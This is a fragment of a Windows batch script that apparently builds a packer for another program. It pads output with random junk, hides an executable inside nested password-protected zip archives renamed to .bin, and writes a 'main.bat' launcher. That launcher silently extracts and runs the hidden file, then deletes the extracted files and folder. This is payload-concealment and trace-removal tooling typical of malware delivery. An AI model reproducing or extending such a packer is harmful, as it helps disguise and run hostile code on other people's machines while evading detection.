...
echo [*] Generating junk code...&for /l %%i in (1,1,64) do (<nul set /p =!random!>> "junk")
...
(ren file.zip file.bin >nul&del /f /q file_!i_2!.zip >nul)&echo [*] Creating launcher...&set /a bb=!r!+11&echo @echo off>> "main.bat"&echo md extracted>> "main.bat"&echo ren file.bin file.zip>> "main.bat"&echo call 7z.exe e file.zip -p%key% -oextracted >> "main.bat"&echo for /l %%%%i in ^(!bb!,-1,1^) do ^(>> "main.bat"&echo call 7z.exe e extracted/file_%%%%i.zip -oextracted>> "main.bat"&echo ^)>> "main.bat"&echo ren file.zip file.bin>> "main.bat"&echo cd extracted>> "main.bat"&echo del /f /q *.zip>> "main.bat"&echo del /f /q *.data>> "main.bat"&echo call "!filename!!">> "main.bat"&echo cd..>> "main.bat"&echo @ping localhost -n 2 ^>nul >> "main.bat"&echo rd /s /q extracted>> "main.bat"
